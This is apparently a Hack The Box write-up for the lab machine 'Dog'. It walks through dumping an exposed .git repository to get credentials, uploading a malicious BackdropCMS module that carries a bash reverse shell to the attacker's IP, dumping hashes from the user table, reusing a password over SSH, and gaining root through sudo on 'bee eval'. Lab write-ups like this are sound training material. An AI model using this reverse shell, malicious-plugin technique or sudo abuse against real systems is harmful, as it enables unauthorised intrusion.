---
layout: post
title: "Dog"
date: 2025-07-12
categories: [htb, easy]
provider: htb
machine: dog
retired: true
---

Remember the intro to [LinkVortex](/writeups/linkvortex/)? I talked about getting stuck on another box, then moving on and learning something new. Dog was that other box, and that lesson makes it very easy to complete, as long as we don't get too deep into rabbit-holes. In short:

<div class="attack-chain">
  {% include attack-step.html title="Enumerate web server" description="Discovered `.git` directory by content bruteforce" type="enum" %}
  {% include attack-step.html title="Analyse git repository" description="Checked out git repository and discovered credentials in source code" type="enum" %}
  {% include attack-step.html title="Abuse plugin system for RCE" description="Logged into admin panel and obtained RCE via malicious plugin" type="attack" %}
  {% include attack-step.html title="Foothold" description="Reused credentials to log into SSH as user `johncusack`" type="foothold" %}
  {% include attack-step.html title="Enumerate permissions" description="Discovered that `johncusack` can run `bee` as root via sudo" type="enum" %}
  {% include attack-step.html title="Privilege escalation" description="Abused arbitrary code evaluation in `bee` to gain root shell via sudo" type="root" %}
</div>

## Virtual Riot's "Dog Fight" on
Dog is a Linux machine, so I think you know how this one starts:
```
$ sudo nmap -p- -sV 10.10.11.58 -vv -oA full-tcp
<SNIP>
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After a minute browsing the website with teary eyes, since it's about one of my favourite things in the whole wide world, I pulled myself back into business. We understand that the site is built with [BackdropCMS](https://backdropcms.org/), we get a few possible usernames from the pages, and we see that the login box allows username enumeration by giving us a different message when it doesn't recognise the user. A few cheap attempts at passwords don't get us anywhere, and it looks like Backdrop doesn't do default credentials either. _Good dog!_

Next step, subdirectory bruteforcing with our then-usual list: 
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.58/FUZZ  -ic

<SNIP>
files                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 24ms]
themes                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 24ms]
modules                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 24ms]
sites                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 21ms]
core                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 24ms]
layouts                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 22ms]
                        [Status: 200, Size: 13332, Words: 1368, Lines: 202, Duration: 27ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 23ms]
:: Progress: [220546/220546] :: Job [1/1] :: 1923 req/sec :: Duration: [0:02:33] :: Errors: 0 ::
```

Apache is misconfigured to allow directory browsing (_bad dog!_), so I spent some time looking for interesting things. About the only thing was another username that the login form accepted, in a settings file:
```
$ curl "http://10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json" 
<SNIP>
    "update_emails": [
        "tiffany@dog.htb"
<SNIP>
```

## Tail between my legs
Next up, virtual host discovery. Nothing. I tried some more brute-forcing of those subdirectories, parameter fuzzing of the CMS's API, nothing. A `robots.txt` file exists, and contains a few possible leads, but also ultimately lead nowhere. UDP scan, negative as well. Searching for vulnerabilities on Backdrop only found an authenticated RCE issue, so we'd need credentials first. Apache 2.4.41 has its share of vulnerabilities as well but nothing actionable, and all definitely out of place in a supposedly Easy box.

This was looking interesting, or like I said in LinkVortex, worrying for the [OSCP aspirer](/articles/oscp-via-cpts/) in me at the time. The checklist of things to try was running thinner, so I went back to the site's content, since there was lots of it and _surely_ I had missed something. I could swear I read somewhere that the hash in the configuration directory name (`config_83dddd18e1ec67fd8ff5bba2453c7fb3`) was a checksum of the site's database connection string, so I scripted something up to try a small brute-force, but there were simply too many variables to look plausible (DBMS, username, host, database name, and of course the password). I'm glad I abandoned that path, because in researching for this write-up, it looks like the hash is very much _not_ derived from the connection string, and I don't know where I got that idea from.

Out of ideas, this was where I first stepped away from the machine. With LinkVortex I remembered that `nikto` was a thing and that I should keep it in my checklist, even if it's at the end. Once again it was `nikto` that found the `.git` directory:
```
$ nikto -h dog.htb
<SNIP>
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
<SNIP>
```

And yeah, lesson learned from these two boxes, the `common.txt` directory wordlist would have found this and more. Just like in the other box though, the excitement was short-lived, because simply browsing through the `.git` database files didn't yield much of interest. The latest commit message told me about "url aliases", so I spent some time trying to find some, looking for new information:
```
$ curl "http://10.10.11.58/.git/logs/HEAD"                                                                                     
0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000   commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
```

I found no such thing.

## Tail wagging
If you _still_ didn't read the other write-up despite my constant references, I give up. So tl;dr for the part that matters here, I realised I could use [git-dumper](https://github.com/arthaud/git-dumper) to grab the `.git` contents and rebuild the code repository locally:
```
$ git-dumper http://dog.htb/.git .
<SNIP>
[-] Running git checkout .
Updated 2873 paths from the index
```

Hurray! We go straight to `settings.php` to look for interesting things, like that very important database connection string:
```
$ cat settings.php 
<SNIP>
$database = 'mysql://root:<REDACTED>@127.0.0.1/backdrop';
<SNIP>
```

Ok, we _finally_ have a password we can use on the login form. We try it with the usernames we already knew of, and manage to login as Tiffany. Tiffany is a site administrator so we are presented with an administration dashboard. Any content management system that supports installing plugins should make you think that you can get code execution on the server, and that's exactly what [that authenticated RCE exploit](https://www.exploit-db.com/exploits/52021) I mentioned earlier does.

When exploits are this simple I prefer to do things manually - you can always learn a thing or two when your attempt doesn't quite work. In this case, we needed to create a module, packaged in a zip file, containing an `.info` file describing the module and a `.php` file with the functionality. I adapted the former from the exploit, and made the latter be a simple reverse shell call to my machine:
```
$ cat backup/backup.info                                       
type = module
name = Shell
description = Just a shell. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Shells
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/shell

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662

$ cat backup/backup.php 
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.75/4444 0>&1'");?>

$ tar cvzf backup.tar.gz backup 
backup/
backup/backup.php
backup/backup.info
```

I installed the module on the website through "Add new modules for more functionality", and after browsing to `http://dog.htb/modules/backup/backup.php`, \[hacker voice\] _we're in_:
```
$ nc -nlvp 4444                
listening on [any] 4444 ...
connect to [10.10.14.138] from (UNKNOWN) [10.129.197.142] 48696
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/backup$  
```

We are only `www-data` though, which doesn't give us our user flag. Checking the `/home` directory we find that there's a `jobert` and a `johncusack`, so we are targeting them.

With the connection string we know how to connect to the database, so we can look at the site's user table, but we find this:
```
www-data@dog:/var/www/html/modules/backup$ mysql -uroot -p
Enter password: <REDACTED>

<SNIP>
mysql> select name, pass from users;
+-------------------+---------------------------------------------------------+
| name              | pass                                                    |
+-------------------+---------------------------------------------------------+
|                   |                                                         |
| jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. |
| jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 |
| dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD |
| john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. |
| morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS |
| axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV |
| rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT |
| tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v |
+-------------------+---------------------------------------------------------+
```

It turns out that the site uses [an annoying mechanism](https://docs.backdropcms.org/api/backdrop/core%21includes%21password.inc/function/_password_crypt/1) to hash the passwords, including a last step that truncates the final hash, negating the use of tools like `hashcat` out of the box. So if we were to crack this by brute-force we'd have to script something together. I decided to leave this and come back to it later if needed, and _spoiler alert_, I'm glad I did.

I was preparing for the OSCP and its 24h exam at the time, so I had been trying to avoid going too deep into rabbit-holes before exhausting other paths that could prove to be of least resistance. First, since I had access to the database I checked the mysql users table, but only root is in it and we knew that password already. Then I looked around the file system some more, but there wasn't much to be found. Then, I remembered the lesson that I keep having to re-learn, and begrudgingly tried the to reuse our only password on `jobert` and `johncusack`... 
```
$ ssh johncusack@dog.htb
johncusack@dog.htb's password: 
<SNIP>

johncusack@dog:~$  
```

Boo. Imagine spending time writing that brute-force script.

## Learning about the dogs and the bees
This was my fastest privilege escalation path to date, so we're almost done. If you're a fan, you know what my first two commands were:
```
johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

I had no idea what `bee` was, but running it without arguments tells us it's a CLI management interface for Backdrop. In the same help output, we learn about the exact kind of feature we are looking for in a sudo-enabled binary:
```
johncusack@dog:~$ bee
<SNIP>
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
<SNIP>
```

When `sudo` and arbitrary code meet, they love each other very much and make beautiful root babies! After a bit more reading and trial and error to learn how to use the tool, it turned out to be the easiest to just run it where the Backdrop site is deployed (`/var/www/html`). Then, it's as simple as this:
```
johncusack@dog:/var/www/html$ sudo bee eval "system('/bin/bash');"
root@dog:/var/www/html#  
```

## Roll the credits
- As in LinkVortex: I'll remember to use `common.txt`, I won't underestimate `nikto`, and I'll chastise myself for not seeing the potential in a `.git` directory.
- Give the low-hanging fruit a fair shot before committing to more effort-intensive paths.
- Password reuse. Password reuse. Password reuse.
- As always, for reading this far, you’re a champ.